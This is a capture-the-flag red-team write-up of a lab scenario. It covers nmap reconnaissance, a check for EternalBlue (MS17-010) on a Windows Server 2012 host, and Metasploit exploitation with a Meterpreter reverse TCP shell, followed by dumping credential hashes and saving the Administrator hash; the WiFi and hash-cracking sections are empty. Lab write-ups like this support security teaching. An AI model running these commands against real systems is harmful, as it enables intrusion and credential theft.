# Scenario 2
Scenario 2 entailed the red teaming in the Cyberforge CTF

## Scenario 2 contains the following methodology:
  1.	Hacker finds WiFi Network “FT_Smart_Factort”
  2.	Hacker uses WIFITE to crack password
  3.	Hacker authenticates onto the Vmbr1 network
  4.	Hacker does recon and discovers devices on network
  5.	Hacker discovers Windows Server 2012 AD Server
  6.	Hacker exploits SMB Eternal Blue CVE to dump credentials
  7.	Hacker authenticates as “Admin”, allowing for access to Vmbr2
  8.	Hacker authenticates into jumphost
  9.	Hacker accesses OT
  10.	 Hacker completes CTF

## Tools and Resources used:
  1. AirCrack
  2. Nmap
  3. Metasploit Framework
  4. Meterpreter
  5. Hashcat
  6. RockYou Wordlist

## WiFi Cracking

## Reconnaissance
After gaining access to the Vmbr1 we perform the following reconnaissance
```bash
sudo nmap -sS -O -p- 192.168.0.0/24
```
This was to scan the network for hosts and to see any open ports and the operating systems.

<img width="891" height="1245" alt="Screenshot From 2026-09-15 17-31-01" src="https://github.com/user-attachments/assets/eab2ca18-5a5b-4254-a6d2-d49521f7c446" />

<img width="1969" height="1119" alt="2" src="https://github.com/user-attachments/assets/bbaa052b-6ea9-4d40-9741-478c73b6ad29" />

<img width="1969" height="1119" alt="3" src="https://github.com/user-attachments/assets/b12be7f0-f27a-43f5-8e7b-541dbaabd4c8" />

We discover a Windows Server 2012 machine on the IP '192.168.0.200'. We then performed a command in nmap to check if the Windows Server 2012 machine was vulnerable to the Eternal Blue exploit.

```bash
sudo nmap -Pn -p 445 --script smb-protocols,smb-vuln-ms17-010 192.168.0.200
```

Which then showed us that the machine was vulnerable.

<img width="1259" height="907" alt="4" src="https://github.com/user-attachments/assets/7dd5de23-bb83-498a-91b3-7d244b0ec3f6" />

## Eternal Blue Exploitation

After this we Opened Metasploit Framework.

```bash
msfconsole
```

And set the exploit as Eternal Blue:

```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
```

We then set the following options:
```msfconsole
set RHOSTS 192.168.0.200
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.6
set LPORT 4444
```
So the following options were:
- RHOSTS as the Vulnerable Windows Server 2012 Machine
- The RPORT as 445 which is used for smb
- The payload as the Meterpreter reverse tcp
- The LHOST as the Kali machine
- The LPORT as port 4444

```msfconsole
check
```
This command then did one final check to confirm the machine was vulnerable to this exploit.

<img width="1259" height="907" alt="5" src="https://github.com/user-attachments/assets/501eca7a-359a-4bbb-8ad0-fa811301f464" />

Once in the Windows Server 2012 CLI, we did the following command to confirm we were in:

```cmd
sysinfo
```
Once confirmed we were in the Windows Server 2012 machine we used the following command to dump all of the password hashes:

```cmd
creds_all
```

Which then gave us the hashes all all the passwords local and on the Active Directory, in particular the Administrator credential hash.

<img width="2558" height="1297" alt="6" src="https://github.com/user-attachments/assets/399322a9-c56d-4b97-8976-6a88e945a7a9" />

We then copied the hash and printed it to an admin.hash file in a separate terminal window:

```bash
printf '%s\n' 'e19ccf75ee54e06b06a5907af13cef42' > admin.hash
```

Then confirming everything was printed in the file correctly:

```bash
cat -A admin.hash
wc -c admin.hash
```

<img width="1018" height="291" alt="7" src="https://github.com/user-attachments/assets/a9a8e82b-bbf6-4d10-a92e-3976d88be0e1" />

## Cracking the Hashed Administrator Password







